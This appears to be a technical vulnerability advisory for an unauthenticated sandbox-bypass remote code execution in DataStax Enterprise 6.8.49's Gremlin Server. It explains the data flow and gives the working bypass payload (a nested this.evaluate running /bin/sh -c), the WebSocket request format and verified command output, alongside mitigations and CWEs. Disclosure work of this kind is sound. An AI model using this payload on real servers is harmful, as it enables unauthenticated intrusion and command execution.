# DataStax Enterprise (DSE) Gremlin-Groovy Sandbox Bypass Unauthenticated RCE — Technical Analysis

## Overview

DataStax Enterprise (DSE) 6.8.49 runs a Gremlin Server on WebSocket 8182 (bind 0.0.0.0 in the container, exposed via host port mapping). The default configuration has the `gremlin_server:` `[authentication]` section commented out, which means TinkerPop's default `allowAll` authenticator — no authentication. The gremlin-groovy sandbox is enabled by default (`sandbox_enabled` defaults to `true` via `orElse(true)`). The sandbox only wraps the top-level submitted script; `groovy.lang.Script.evaluate(String)` (inherited by `DseScript`) creates a fresh `GroovyShell` with a default `CompilerConfiguration` that does NOT include the `SandboxTransformer`, so a nested string is compiled and executed sandbox-free. An attacker submits `this.evaluate("<nested script>")`; the nested script runs `["/bin/sh","-c","<cmd>"].execute().text`, executing arbitrary system commands as the `dse` user (uid=999, groups include 0(root)). Dynamically verified.

- **Authentication required**: None (default `allowAll`)
- **Preconditions**: Default configuration; network reachability to the Gremlin WebSocket port
- **Affected versions**: 6.8.49 (Docker `datastax/dse-server:6.8.49` with DSE Graph)
- **Privilege**: `dse` user (uid=999, groups include root)

## Architecture

```
L1 external access: Gremlin WebSocket ws://host:8182/gremlin (no auth)
L2 auth boundary: [authentication] commented out = TinkerPop allowAll (no auth)
L3 sandbox: DseGraphSandboxPlugin registers SandboxTransformer (sandbox_enabled=true default)
L4 source: WebSocket eval op args.gremlin (fully attacker-controlled string)
L5 eval: GremlinGroovyScriptEngine.eval -> GroovyClassLoader.doParse -> AST rewrite (SandboxTransformer)
L6 bypass: DseScript.run() -> this.evaluate("<nested>") -> groovy.lang.Script.evaluate
L7 sink: new GroovyShell(no SandboxTransformer) -> shell.evaluate -> "cmd".execute() -> Runtime.exec
L8 exec: as dse user (uid=999, groups include root)
```

## Authentication Boundary

`dse.yaml` `gremlin_server:` section:

```yaml
gremlin_server:
  # [authentication]
  #   className: ...
  #   config:
  #     # username: ...
  #     # password: ...
```

`[authentication]` commented out = TinkerPop default `allowAll` authenticator = no auth. WebSocket handshake accepts scripts with no credential fields. The sandbox config:

```java
// com.datastax.bdp.graph.plugin.GremlinServerPlugin.setupGroovyGremlinEngine()
if (Optional.ofNullable((Boolean)gremlinGroovyConf.get("sandbox_enabled")).orElse(true).booleanValue()) {
    gremlinGroovyPlugins.putIfAbsent(DseGraphSandboxPlugin.class.getName(), Collections.emptyMap());
}
```

`sandbox_enabled` defaults to `true` (`orElse(true)`) — the sandbox is on by default. The bypass works WITH the sandbox enabled, so this is a real vulnerability, not a "disable sandbox" misconfiguration.

## Stage 1: Sink Identification

The Gremlin-Groovy script engine allows arbitrary Groovy scripts. Command-execution sinks (Groovy primitives):

- `"cmd".execute()` -> `Runtime.getRuntime().exec("cmd")`
- `Runtime.getRuntime().exec(...)`
- `new ProcessBuilder(...).start()`
- `["/bin/sh","-c","cmd"].execute()`

These are blocked by the sandbox at the top level, but reachable via `this.evaluate()` (Stage 5).

## Stage 2: Source Identification

Source = the `args.gremlin` field of the Gremlin WebSocket `eval` op (fully attacker-controlled):

```json
{"requestId":"<uuid>","op":"eval","processor":"",
 "args":{"gremlin":"<user-controlled script>","bindings":{},"language":"gremlin-groovy","aliases":{}}}
```

`requestId` must be a UUID (with hyphens), else the server fails deserialization with 499 "Invalid OpProcessor requested [null]". `args.gremlin` is an arbitrary Groovy string with no length/character filter.

## Stage 3: Data Flow

```
Remote attacker
  | WebSocket ws://host:8182/gremlin (no auth)
  v
Gremlin Server (DseWebSocketChannelizer)
  | parses RequestMessage (op=eval, language=gremlin-groovy)
  v
GremlinGroovyScriptEngine.eval(gremlin, bindings)
  | CompilerConfiguration includes SandboxTransformer (DseGraphSandboxPlugin)
  v
GroovyClassLoader.doParse -> AST rewrite (SandboxTransformer wraps every method call/ctor/property access)
  | generates DseScript subclass (extends groovy.lang.Script)
  v
DseScript.run()  <- top-level script is sandboxed
  | this.evaluate("\"id\".execute().text")  <- user input
  v
groovy.lang.Script.evaluate(String expression)   <- bypass point
  | new GroovyShell(this.getClass().getClassLoader(), this.binding)
  |   <- fresh GroovyShell, default CompilerConfiguration, NO SandboxTransformer
  v
shell.evaluate(expression)  <- nested string compiled/executed sandbox-free
  | "\"id\".execute().text"
  v
"id".execute() -> Runtime.exec("id") -> Process -> stdout
```

## Stage 4: Bypass Construction

Top-level script:

```
this.evaluate("[\"/bin/sh\",\"-c\",\"<cmd>\"].execute().text")
```

The nested string is evaluated by `groovy.lang.Script.evaluate`, which creates a fresh `GroovyShell` without the `SandboxTransformer`, so the shell command runs sandbox-free. Shell semantics (redirection/pipes/semicolons) are supported via `sh -c`.

## Stage 5: Dynamic Verification

### Sandbox-active verification (direct exec blocked)

Top-level `"id".execute().text` is blocked by the sandbox (status 597 or Sandbox message), confirming the sandbox is active by default.

### Bypass verification (this.evaluate succeeds)

`this.evaluate("\"id\".execute().text")` executes successfully, returning `uid=999(dse) gid=999(dse) groups=999(dse),0(root)` — confirming RCE as the `dse` user with root group membership.

### Marker verification

A fresh marker written to the host and independently confirmed host-side verified command execution.

## Mitigation

1. Enable Gremlin Server authentication (`[authentication]` with username/password or LDAP) so the WebSocket endpoint is not `allowAll`
2. Disable or sandbox `groovy.lang.Script.evaluate(String)` — the nested GroovyShell must carry the same `SandboxTransformer` (or the evaluate path must be blocked)
3. Run DSE under a dedicated non-root user without root group membership
4. Restrict network exposure of the Gremlin WebSocket port to trusted networks
5. Apply upstream patches when DataStax releases a fix for the sandbox bypass

## CWEs

- CWE-306 (Missing Authentication for Critical Function) - Gremlin Server allowAll default
- CWE-94 (Improper Control of Generation of Code) - nested Groovy eval without sandbox
- CWE-693 (Protection Mechanism Failure) - sandbox applied only to top-level script, not nested evaluate
- CWE-250 (Execution with Unnecessary Privileges) - dse user in root group
